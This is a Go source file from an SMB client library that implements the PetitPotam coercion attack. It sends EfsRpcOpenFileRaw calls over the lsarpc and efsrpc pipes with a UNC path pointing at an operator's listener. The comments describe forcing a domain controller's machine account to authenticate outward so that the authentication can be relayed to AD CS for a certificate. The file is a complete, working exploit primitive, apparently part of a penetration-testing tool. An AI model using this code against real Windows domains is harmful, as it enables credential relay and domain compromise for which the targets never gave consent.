package smbclient

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"unicode/utf16"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/smb"
)

// MS-EFSR (Encrypting File System Remote) interface UUIDs — the same
// interface served under two UUID/pipe pairs (MS-EFSR §1.9, §2.1
// Transport): c681d488-... on the lsass pipes (\pipe\lsarpc, and also
// samr/netlogon/lsass), df1941c5-... on \pipe\efsrpc. Both are v1.0.
// internal/scan/uuids.go flags the pair as the PetitPotam coercion target.
var (
	efsrLsarpcUUID = dcerpc.MustParseUUID("c681d488-d850-11d0-8c52-00c04fd90f7e")
	efsrEfsrpcUUID = dcerpc.MustParseUUID("df1941c5-fe89-4e79-bf10-463657acf44d")
)

// opEfsRpcOpenFileRaw is MS-EFSR §3.1.4.2.1 "EfsRpcOpenFileRaw (Opnum 0)".
const opEfsRpcOpenFileRaw = 0

// errEFSRUnsupported marks "the server won't serve MS-EFSR here" failures
// (pipe missing, bind rejected, opnum unimplemented) so CoercePetitPotam
// can sweep to the next endpoint. Wrapped messages keep the
// "not supported on this server" wording.
var errEFSRUnsupported = errors.New("MS-EFSR not supported on this server")

// petitPotamEndpoint is one place the MS-EFSR interface may be served.
type petitPotamEndpoint struct {
	pipe string
	uuid [16]byte
}

// petitPotamEndpoints is the sweep order: lsarpc first — topotam's
// PetitPotam.py defaults to it and its own comment calls efsrpc "moins
// universel et plus rare que lsarpc" (possible too via efsrpc with the
// other UUID, but the pipe is less universal than lsarpc).
var petitPotamEndpoints = []petitPotamEndpoint{
	{"lsarpc", efsrLsarpcUUID},
	{"efsrpc", efsrEfsrpcUUID},
}

// Win32 codes (MS-ERREF) EfsRpcOpenFileRaw returns when the server DID
// attempt to open our UNC path and failed at or beyond the network
// redirector — the machine-account connection to the listener was already
// attempted, which is the entire point of the coercion. topotam's
// PetitPotam.py treats ERROR_BAD_NETPATH as its canonical "Attack worked!"
// signal; the others are the same class of outcome (different failure
// stages of the outbound SMB session: DNS/connect, tree-connect, file
// open, and the listener refusing the machine account's logon).
var petitPotamFiredCodes = map[uint32]string{
	0x00000002: "ERROR_FILE_NOT_FOUND",
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x0000003B: "ERROR_UNEXP_NET_ERR",
	0x00000040: "ERROR_NETNAME_DELETED",
	0x00000043: "ERROR_BAD_NETWORK_NAME",
	0x0000007B: "ERROR_INVALID_NAME",
	0x0000052E: "ERROR_LOGON_FAILURE",
}

// CoercePetitPotam fires the PetitPotam coercion primitive (topotam, July
// 2021): EfsRpcOpenFileRaw (MS-EFSR opnum 0) with FileName =
// \\<listener>\share\file. The target's EFS service — lsass.exe — opens
// the path through the SMB redirector AS THE TARGET'S MACHINE ACCOUNT,
// and that outbound authentication is what the operator's listener/relay
// captures (relay it to AD CS web enrollment and the victim DC's machine
// account becomes a certificate you own). A nil error means the trigger
// was DELIVERED and the server attempted the open; proving the machine
// account called home is what ListenForCallback (coerce.go) is for.
//
// listener is a bare host or IP (a leading \\ is stripped). The EFSR
// interface is swept lsarpc-first per the reference PoC. Any authenticated
// user could trigger EfsRpcOpenFileRaw pre-patch — that was the headline
// of the 2021 disclosure; current Windows still serves the call to
// authenticated sessions but may refuse with ERROR_ACCESS_DENIED depending
// on version/hardening, themed here as "access denied — PetitPotam
// blocked". Against non-Windows SMB servers there is no MS-EFSR server at
// all (the lab Samba DC answers missing-pipe / bind_nak), themed as
// "not supported on this server".
func (s *Session) CoercePetitPotam(listener string) error {
	listener = strings.TrimPrefix(listener, `\\`)
	if listener == "" {
		return fmt.Errorf("no listener address given")
	}
	unc := `\\` + listener + `\share\file`

	var lastErr error
	for _, ep := range petitPotamEndpoints {
		err := s.efsRpcOpenFileRaw(ep, unc)
		switch {
		case err == nil:
			return nil
		case !errors.Is(err, errEFSRUnsupported):
			// Access denied or a transport failure — the other pipe serves
			// the same interface through the same lsass backend, so the
			// answer would be identical.
			return err
		default:
			lastErr = err
		}
	}
	return lastErr
}

// efsRpcOpenFileRaw performs one bind + call against a single endpoint.
// The pipe rides IPC$ on the existing SMB session — no new channel, same
// one-connection discipline as the rest of the package.
func (s *Session) efsRpcOpenFileRaw(ep petitPotamEndpoint, uncPath string) error {
	pipe, err := s.client.OpenPipe(ep.pipe)
	if err != nil {
		if smb.IsNotFound(err) {
			return fmt.Errorf("%w (no \\pipe\\%s)", errEFSRUnsupported, ep.pipe)
		}
		return fmt.Errorf("open %s pipe: %v", ep.pipe, err)
	}
	defer pipe.Close()

	rpc := dcerpc.NewClient(pipe)
	if err := rpc.Bind(ep.uuid, 1, 0); err != nil {
		return mapPetitPotamError(fmt.Errorf("bind EFSR: %w", err))
	}

	resp, err := rpc.Call(opEfsRpcOpenFileRaw, buildEfsOpenFileRawRequest(uncPath))
	if err != nil {
		return mapPetitPotamError(fmt.Errorf("EfsRpcOpenFileRaw: %w", err))
	}
	return petitPotamResult(resp)
}

// buildEfsOpenFileRawRequest marshals the EfsRpcOpenFileRaw request stub.
// Per MS-EFSR §3.1.4.2.1 the MIDL signature is
//
//	long EfsRpcOpenFileRaw(
//	  [in] handle_t binding_h,
//	  [out] PEXIMPORT_CONTEXT_HANDLE hContext,
//	  [in, string] wchar_t FileName,
//	  [in] long Flags
//	);
//
// FileName is a bare [string] wchar_t, NOT a pointer (no "*" in the IDL),
// so there is NO referent ID on the wire — the parameter marshals directly
// as a conformant-and-varying string (C706 §14.3.4): the
// MaxCount/Offset/ActualCount triple in UTF-16 code units with the NUL
// terminator COUNTED ([string] semantics — the terminator is
// transmitted), the UTF-16LE characters, zero padding to the 4-byte
// boundary, then Flags. topotam's PetitPotam.py models it identically —
// ('fileName', WSTR), ('Flag', ULONG) with impacket's bare (non-pointer)
// WSTR — and its marshaled bytes were reproduced field-for-field during
// development (impacket pads the alignment gap with 0xbf; the gap's
// content is unspecified per C706 §14.2.2, so zeros are equivalent).
// Flags is 0: the spec reserves it and the reference PoC sends 0.
func buildEfsOpenFileRawRequest(path string) []byte {
	chars := utf16.Encode([]rune(path))
	chars = append(chars, 0) // NUL terminator, counted in both counts

	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // MaxCount
	binary.Write(buf, binary.LittleEndian, uint32(0))          // Offset
	binary.Write(buf, binary.LittleEndian, uint32(len(chars))) // ActualCount
	for _, c := range chars {
		binary.Write(buf, binary.LittleEndian, c)
	}
	if buf.Len()%4 != 0 {
		buf.Write(make([]byte, 4-buf.Len()%4)) // align Flags to a DWORD boundary
	}
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Flags
	return buf.Bytes()
}

// petitPotamResult interprets the EfsRpcOpenFileRaw response stub
// (MS-EFSR §3.1.4.2.1): hContext — an EXIMPORT_CONTEXT_HANDLE context
// handle, 20 raw bytes (topotam's EfsRpcOpenFileRawResponse models it as
// ('Data', '20s')) — followed by the Win32 error code. The handle is
// ignored: the original PoC never calls EfsRpcCloseRaw either, and the
// server cleans the context up when the association drops at pipe close.
func petitPotamResult(resp []byte) error {
	if len(resp) < 24 {
		return fmt.Errorf("short EfsRpcOpenFileRaw response (%d bytes)", len(resp))
	}
	code := binary.LittleEndian.Uint32(resp[20:24])
	switch {
	case code == 0: // ERROR_SUCCESS — the file opened; coercion fired
		return nil
	case code == 0x00000005: // ERROR_ACCESS_DENIED
		return fmt.Errorf("access denied — PetitPotam blocked")
	default:
		if _, fired := petitPotamFiredCodes[code]; fired {
			return nil
		}
		return fmt.Errorf("EfsRpcOpenFileRaw failed on the server (error %d / 0x%08x)", code, code)
	}
}

// mapPetitPotamError translates bind/call failures into plain language
// (themed-errors idiom; feature-local like mapProcError). Statuses are
// matched on their rendered form: pkg/dcerpc renders a bind_nak as
// "bind rejected: ..." and faults as "RPC Fault: status=0x........".
// "Not supported" outcomes wrap errEFSRUnsupported so the endpoint sweep
// in CoercePetitPotam can recognize them via errors.Is.
func mapPetitPotamError(err error) error {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "bind rejected"):
		// bind_nak — the pipe answered but won't serve the EFSR UUID on it.
		return fmt.Errorf("%w (interface rejected the bind)", errEFSRUnsupported)
	case strings.Contains(msg, "0x00000005"): // rpc_s_access_denied == ERROR_ACCESS_DENIED
		return fmt.Errorf("access denied — PetitPotam blocked")
	case strings.Contains(msg, "0x1c010002"), // nca_s_op_rng_error — opnum not implemented
		strings.Contains(msg, "0x000006f7"): // EPT_S_NOT_REGISTERED
		return fmt.Errorf("%w (EFSR opnums unimplemented)", errEFSRUnsupported)
	}
	return err
}
